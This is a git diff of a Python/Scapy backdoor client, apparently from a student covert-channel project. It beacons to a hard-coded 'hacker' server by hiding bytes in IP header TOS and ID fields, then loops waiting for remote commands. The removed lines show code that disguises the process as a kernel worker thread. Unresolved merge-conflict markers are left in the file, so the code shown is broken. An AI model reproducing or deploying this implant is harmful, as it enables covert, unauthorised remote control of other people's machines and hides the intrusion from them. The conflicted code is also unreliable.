@@ -18,38 +18,41 @@ from encrypt import *
 import argparse
 import sys
 import string
-from setproctitle import getproctitle, setproctitle
+#from setproctitle import getproctitle, setproctitle
 
 
 WAITING = 1
 KEY = "runningman"	# used for decryption
 serv_addr = "192.168.1.9"	# hacker waits for client to run the program
 
-def change_proc():
-	try:
-		from setproctitle import getproctitle, setproctitle
-	except ImportError:
-		logging.warning(
-		    ("Unable to set import 'setproctitle', "
-		     "process name cannot be changed"))
-	else:
-		setproctitle("%s" % "[kworker/2:3><><><><><><]")
+# def change_proc():
+# 	try:
+# 		from setproctitle import getproctitle, setproctitle
+# 	except ImportError:
+# 		logging.warning(
+# 		    ("Unable to set import 'setproctitle', "
+# 		     "process name cannot be changed"))
+# 	else:
+# 		setproctitle("%s" % "[kworker/2:3><><><><><><]")
 
 
 
 def recv_packet(pkt):
-	#print str(unichr(pkt[IP].tos))
-	print pkt.show()
+	print chr(pkt[IP].tos)
 
 def main():
 	global WAITING
 	# 0. when this program is run, change the process name
-	change_proc()
+	#change_proc()
 	
 	# 1. send initial packet that backdoor client program is run to server
 	send(IP(dst=serv_addr, tos=ord('B'), id=ord('K'))/fuzz(UDP(dport=80, sport=123))/'start', loop=0)
 	
+<<<<<<< HEAD
 	2. wait for command from backdoor server (sniffing)
+=======
+	# 2. wait for command from backdoor server (sniffing)
+>>>>>>> fa24d2e35102fe8a434bd9302e34477c893b61bb
 	while True:
 		if WAITING == 1:
 			print "waiting 1"
@@ -61,7 +64,10 @@ def main():
 			WAITING = 1
 			continue
 
+<<<<<<< HEAD
 	
+=======
+>>>>>>> fa24d2e35102fe8a434bd9302e34477c893b61bb
 
 
 if __name__ == '__main__':
